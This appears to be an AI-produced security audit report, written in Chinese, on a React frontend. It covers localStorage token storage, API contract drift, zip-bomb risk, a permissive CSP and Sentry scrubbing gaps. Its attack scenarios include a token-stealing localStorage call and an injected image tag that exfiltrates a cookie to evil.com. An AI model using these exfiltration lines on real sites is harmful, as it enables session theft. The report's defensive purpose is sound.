# 安全与依赖审计报告(2026-06-22)

> 本报告由「安全与依赖审计」子代理产出。原代理为只读模式,无法直接写文件,由主代理代为落盘。报告内容、证据、结论均与子代理产出一致。

**审计范围**:绿洲慧写3.0 前端(React 19 + Vite 7 + TypeScript)
**审计维度**:安全与依赖
**审计模式**:只读(未修改任何代码或文件)

---

## 一、执行摘要(突出最严重的 3 个安全问题)

整体来看,该项目的安全基线建设非常扎实:CSP 头部、rehype-sanitize 白名单、DOMPurify、Sentry 脱敏、密钥扫描钩子、token 绑定校验等防护均已落地,且 `npm audit`、密钥扫描、API lint 全部零命中。最值得关注的问题不是"已激活的漏洞",而是"防护的盲区"与"契约与实现的脱节":

1. **【P1】前端持久化的访问令牌(Access Token)存于 localStorage,且无 HttpOnly 保护** —— `src/api/core/token-storage.ts`。任何能在页面执行 JS 的 XSS(即使绕过 sanitize 的某个边角)都能读走 30 天有效期的 token。建议后端改为 HttpOnly Cookie,或前端只放内存态。

2. **【P1】API 契约(`docs/api/*.yaml`)与实际实现(`src/api/services/*`)大面积不一致** —— 契约声明 `/api/auth/login`、`/api/notifications`、`/api/notifications/{id}/read` 等,实现却用 `/auth/pwdlogin`、`/user/usermessagelist`、`/user/userhasread/{id}`。契约形同"草稿文档",不能作为前后端对接或安全评审的真实依据。

3. **【P2】后端导出 ZIP 的解压缺少 zip bomb(压缩炸弹)防护** —— `src/utils/user-data-export.ts:142`。虽然有路径穿越防护(`sanitizeFileName` + `ensureUniquePath`),但没有总解压大小/条目数上限。恶意后端或被篡改的导出包可造成浏览器内存耗尽。

此外有几条 P2 需留意:CSP 允许 `img-src https:` 任意来源、Sentry 脱敏未覆盖 `request.body`/`tags` 全量字段、`config-detail` 等少量 GET 接口被误用为状态变更(后端设计问题)。详见第三节。

---

## 二、验证命令执行结果

### 2.1 `npm run security:scan`
```
[security-scan] scanned 1255 files, no leaks found
```
- 命中数:**0**
- 扫描器逻辑(`scripts/security/scan-secrets.mjs`):检测 `sk-`(OpenAI)、`app-`、`AKIA`/`ASIA`(AWS)、生产环境 `pwdlogin` URL、手机号+密码组合。误报率低,allowlist 已排除 `YOUR_*_HERE`、`sk-****` 等占位符。

### 2.2 `npm run audit:prod:json`
> 说明:`package.json` 中没有 `audit:prod:json` 这个 script(只有 `audit:prod` 和 `audit:full:json`)。改用 `npm run audit:prod -- --json` 执行等价检查。

```
"vulnerabilities": {},
"metadata": {
  "vulnerabilities": { "critical": 0, "high": 0, "moderate": 0, "low": 0 },
  "dependencies": { "prod": 292, "dev": 829, "total": 1121 }
}
```
- critical/high/moderate/low:**0 / 0 / 0 / 0**
- `npm run audit:full:json`(含 dev 依赖)同样全部为 0。
- `package.json` 中的 `overrides` 已主动收敛:`dompurify 3.4.11`、`fast-xml-parser 5.8.0`、`js-yaml 4.2.0`、`lodash/lodash-es 4.18.1`、`esbuild 0.28.1`,用于兜底间接依赖的历史漏洞。

### 2.3 `npm run api:lint`
```
No results with a severity of 'error' found!
```
- 命中数:**0 error**(Spectral lint 通过)。

### 2.4 `npm run api:unused`
```
All monitored components are referenced.
python3 exit status: 0 error: none
```
- 未引用组件:**0**(该脚本只检查 `$ref` 是否被引用,不检查契约与实现是否一致)。

### 2.5 `.gitignore` 敏感文件覆盖核查
`.gitignore` 已正确忽略:`.env`、`.env.development`、`.env.production`、`.env.*.local`。`git ls-files` 确认仓库中只跟踪 `.env.example` 与 `.env.production.example`(均为模板,无真实密钥)。

---

## 三、问题清单(按 P0/P1/P2 分级)

### 问题 1
- **【等级】** P1
- **【类别】** 凭证存储(XSS 提权风险)
- **【位置】** `src/api/core/token-storage.ts:2,96-106,200-218`; `src/stores/useAuthStore.ts:46-57`
- **【症状】** 访问令牌写入 `localStorage` 键 `auth_access_token_v1`,TTL = 30 天(`SESSION_TTL_MS`)。同时 `user` 对象(含手机号 `phone`、余额 `balance`)也明文存于 `localStorage` 的 `user` 键。
- **【根因】** 浏览器 `localStorage` 对同源任意 JS 可读,且无 HttpOnly 保护。一旦页面内出现任何 XSS(包括第三方库被污染),攻击者可直接读取令牌。
- **【攻击场景】** 假设 mermaid/katex/某个 npm 包引入了 XSS,或用户被诱导访问带 payload 的分享链接,攻击脚本一行 `localStorage.getItem('auth_access_token_v1')` 即可盗走 30 天有效的 token,在另一台机器上冒充用户(项目虽然有 `binding` 绑定 navigator.language+userAgent,但这两者可被轻易伪造,几乎不构成阻力)。
- **【影响范围】** 全部登录用户的会话凭据。
- **【修复建议】** 优先方案:后端把 access token 改为 `HttpOnly; Secure; SameSite=Strict` 的 Cookie,前端不再持有明文 token。退一步:token 只放内存(不写 localStorage),刷新页面时走 silent re-auth; 手机号等 PII 不要塞进 localStorage。

### 问题 2
- **【等级】** P1
- **【类别】** 契约不一致(API 契约失真)
- **【位置】** `docs/api/users-auth.yaml:179,28,237` vs `src/api/services/auth.service.ts:72,116,226`; `docs/api/users-auth.yaml:404,449,471` vs `src/api/services/notification.service.ts:97-239`
- **【症状】** 契约与实现路径、方法、字段全面对不上。详见第五节差异清单。
- **【根因】** 契约文件标注 `version: '0.1.0-draft'`,实际是早期设计稿,代码后来按真实后端(手机号体系)实现,但契约从未回填。`api:lint`/`api:unused`/`api:metadata` 三道关卡都只校验契约自身语法和引用完整性,没有"契约 vs 实际调用"的对照,所以漂移长期未被捕获。
- **【攻击场景】** 安全评审、第三方接入、渗透测试若以契约为依据,会漏掉真实暴露的接口面(如 `/auth/pwdlogin`、`/user/updatepwd`),形成审计盲区;契约里描述的 2FA(`/api/auth/2fa/*`)在代码中根本不存在,会让人误以为账号有二次验证保护。
- **【影响范围】** 全部 auth/通知接口的可信度。
- **【修复建议】** 以实现为真源反向生成契约,或在 CI 增加一道"端点对照"检查(把 `apiClient.{get,post,...}('...')` 的字面量端点抽取出来,与 yaml 的 `path` 做差集比对),让漂移可见。

### 问题 3
- **【等级】** P2
- **【类别】** 解压安全(zip bomb 防护缺失)
- **【位置】** `src/utils/user-data-export.ts:142-161,235`
- **【症状】** `JSZip.loadAsync(baseZipBlob)` 解压后端下发的导出包,再 `forEach` 遍历、`generateAsync` 重新打包,但没有限制总解压字节数、条目数、单条目大小。
- **【根因】** 信任后端返回的压缩包,缺少"解压炸弹"防御(高压缩比包导致内存爆炸)。
- **【攻击场景】** 后端被入侵或导出接口被劫持,返回一个 1MB 压缩成 2GB 的恶意包; 前端解压时浏览器标签页 OOM 崩溃,甚至触发整体卡死。路径穿越方面已有防护(`sanitizeFileName` 过滤 `\/:*?"<>|`,`ensureUniquePath` 防覆盖),所以这条只针对"体积"。
- **【影响范围】** 触发"导出增强包"功能的用户(DoS,非数据泄露)。
- **【修复建议】** 解压过程中累计 `zip.forEach` 的条目数与预估解压大小,超过阈值(如 5000 条或 500MB)即中止并回退到原始 blob。

### 问题 4
- **【等级】** P2
- **【类别】** CSP 放宽
- **【位置】** `src/config/security.ts:13,15`
- **【症状】** `img-src 'self' data: blob: https: http://127.0.0.1:* http://localhost:*` 和 `connect-src ... https: ...`。`https:` 通配意味着任意 HTTPS 域的图片/接口都允许。
- **【根因】** 为了兼容 OSS、Sentry、Dify 等多方域名,放宽到协议通配。
- **【攻击场景】** XSS 注入 `<img src=https://evil.com/x.png?cookie=...>` 可向外泄露数据(虽然 cookie 是 HttpOnly 才有用,但当前 token 在 localStorage,通过 img-src 外带是可行的)。同理 `connect-src https:` 允许任意 fetch 外带。
- **【影响范围】** 一旦出现 XSS,数据外泄通道几乎不受 CSP 阻拦。
- **【修复建议】** 把 `img-src`/`connect-src` 的 `https:` 收窄为具体域名白名单(自家 API、OSS、Sentry DSN 域)。

### 问题 5
- **【等级】** P2
- **【类别】** 监控脱敏盲区
- **【位置】** `src/monitoring/sentry-scrubbing.ts:9-20,50-80`
- **【症状】** `sanitizeSentryEvent` 只处理 `request.headers/cookies/url`、`extra`、`breadcrumbs`。未覆盖 `event.tags`、`event.contexts`、`event.request.body`、`event.exception.values[].stacktrace.frames` 中的变量值。
- **【根因】** 脱敏函数覆盖面不全。`reportError(context)` 调用处(`index.ts:125-138`)把任意 `extra` 透传,虽然 extra 被洗过,但 tags(`Sentry.setTag`)在 `index.ts:84-86` 直接写入,不做脱敏。
- **【攻击场景】** 若某处把手机号/邮箱作为 tag 或塞进 exception context 上报,会进入 Sentry 服务端,违反 PII 合规。
- **【影响范围】** 监控数据可能携带 PII。
- **【修复建议】** 在 `beforeSend` 里对 `event.tags`、`event.contexts` 也跑一遍 `scrubSensitiveValue`; 并对 stacktrace 中的局部变量值做模式过滤(或关闭 Sentry 的局部变量采集)。

### 问题 6
- **【等级】** P2
- **【类别】** 接口语义不规范(状态变更用 GET)
- **【位置】** `src/api/services/notification.service.ts:218,225,232,239`; `src/api/services/history.service.ts:188,253,262`
- **【症状】** 标记已读、删除、重命名、移动这些"写操作"全部用 `apiClient.get(...)` 调用。
- **【根因】** 后端约定如此,前端照搬。GET 改状态违背 REST 语义,且易被 CSRF/预取/浏览器预渲染触发。
- **【攻击场景】** 浏览器为加速可能在地址栏预取这些 GET URL; 或恶意页面用 `<img src=...>` 触发"删除全部通知"等操作(因 token 在 localStorage 而非 Cookie,CSRF 风险降低,但接口本身仍不安全)。
- **【影响范围】** 通知/历史数据的非预期修改。
- **【修复建议】** 推动后端把写操作改为 POST/DELETE; 前端契约同步。

### 问题 7(信息项,非漏洞)
- **【等级】** P2(观察项)
- **【类别】** XSS 防护确认(无问题)
- **【位置】** `src/components/ContentRenderer/index.tsx:336-343`; `MermaidChart.tsx:27-38,144-148,248`; `sanitize-schema.ts`
- **【症状】** `dangerouslySetInnerHTML` 仅用于 mermaid 渲染输出,且 mermaid 已初始化 `securityLevel: 'strict'`、`htmlLabels: false`,SVG 输出再过 DOMPurify(svg profile)+ `UNSAFE_SVG_PATTERN` 双重校验。Markdown 渲染强制走 `rehype-sanitize` + 自定义白名单 schema,KaTeX 的 MathML 标签虽放开但不含 `script`/事件属性,安全。`urlTransform` 会把非 http(s)/mailto/data-image 的协议清空,防 `javascript:` 注入。
- **【结论】** XSS 防护链完整,未发现可绕过点。

---

## 四、依赖漏洞详情表

`npm audit` 返回 0 条漏洞,因此下表为空。`overrides` 兜底情况:

| 包名 | overrides 版本 | 用途 | 状态 |
|---|---|---|---|
| dompurify | 3.4.11 | HTML/SVG 消毒 | 已固定到最新,无已知 CVE |
| fast-xml-parser | 5.8.0 | mermaid 间接依赖 | 已升级,规避历史原型污染 |
| js-yaml | 4.2.0 | 多处 YAML 解析 | 已升级 |
| lodash / lodash-es | 4.18.1 | 工具链间接依赖 | 已升级 |
| esbuild | 0.28.1 | Vite 构建 | 已升级 |

CVE 数量:critical 0 / high 0 / moderate 0 / low 0。

---

## 五、API 契约与实现差异清单

> 契约文件:`docs/api/users-auth.yaml`(version `0.1.0-draft`)
> 实现文件:`src/api/services/auth.service.ts`、`notification.service.ts`

| 契约路径 | 契约方法 | 实现路径 | 实现 方法 | 差异说明 |
|---|---|---|---|---|
| `/api/auth/login` | POST(邮箱/手机+密码或验证码) | `/auth/login` | POST | 路径少 `/api` 前缀; 实现仅支持手机+验证码 |
| —(无) | — | `/auth/pwdlogin` | POST | **契约完全没有此接口**,实现却用它做密码登录 |
| `/api/auth/register` | POST(邮箱+验证码) | `/auth/register` | POST | 路径不一致; 字段从 email 改为 phone+code+invite_code |
| `/api/auth/register/verify`、`/register/resend` | POST | —(无) | — | 契约有,实现无 |
| `/api/auth/refresh` | POST(refreshToken) | —(无) | — | 契约有刷新接口,实现明确注释"后端不支持 refresh token" |
| `/api/auth/logout` | POST | `/auth/logout` | POST | 路径少 `/api` |
| `/api/auth/2fa/challenge`、`/2fa/verify` | POST | —(无) | — | 契约有 2FA,实现无 |
| —(无) | — | `/auth/send` | POST | **契约无**,实现用它发短信验证码 |
| —(无) | — | `/user/updatepwd` | POST | **契约无**,字段名拼写为 `newpasssword`(三 s) |
| `/api/notifications` | GET | `/user/usermessagelist` | GET | 路径完全不同; 参数 `type` 语义不同 |
| `/api/notifications/{id}/read` | POST | `/user/userhasread/{id}` | **GET** | 路径+方法都不一致(写操作用 GET) |
| `/api/notifications/read-batch` | POST | `/user/userhasreadall` | **GET** | 路径+方法不一致 |
| `/api/notifications/{id}` (删除) | DELETE | `/user/userhasdel/{id}` | **GET** | 方法不一致 |
| `/api/notifications/channel-token` | GET | —(无) | — | 契约有,实现无 |

> 备注:其他契约文件(`billing.yaml`、`projects.yaml`、`files.yaml` 等)未逐一展开,但 auth/notification 的漂移模式具有代表性,建议作为整改样板。

---

## 六、整体安全评级(1-10 分 + 理由)

**评分:7.5 / 10**

**加分项(做得好的地方)**:
- 依赖零漏洞,且用 `overrides` 主动收敛高危间接依赖;
- 密钥扫描进入 pre-commit 钩子(`.husky/pre-commit` → `security:scan-staged`),误报率低;
- Markdown 渲染走 `rehype-sanitize` 白名单 + `urlTransform` 协议过滤,Mermaid 走 strict + DOMPurify + 正则三重防护,XSS 防护链完整;
- `oasis-actions` 自定义解析器做了严格的长度/枚举/禁用字段白名单,非常稳健;
- CSP、`X-Content-Type-Options`、`Referrer-Policy`、`frame-ancestors: 'none'` 等安全头齐全;
- Sentry 初始化开启 `maskAllText/maskAllInputs/blockAllMedia`,且 `beforeSend` 做脱敏;
- token 存储带版本号、TTL、binding 校验、非法格式自动清除;
- `index.html` 不引入任何第三方 CDN 脚本; `postMessage` 仅用于同源 Web Worker(hash 计算),无跨域 iframe 通信风险。

**扣分项(主要短板)**:
- 访问令牌存 localStorage 且 30 天有效,与 HttpOnly Cookie 方案相比,XSS 提权风险偏高(-1.0);
- API 契约与实现大面积脱节,契约形同草稿,削弱了审计与对接的可信度(-0.8);
- CSP 的 `img-src`/`connect-src` 放宽到 `https:` 通配,削弱了数据外带兜底(-0.4);
- Sentry 脱敏未覆盖 tags/contexts 全量字段(-0.3)。

把令牌存储改造、契约回填两件事做完,可稳定提到 8.5 分以上。
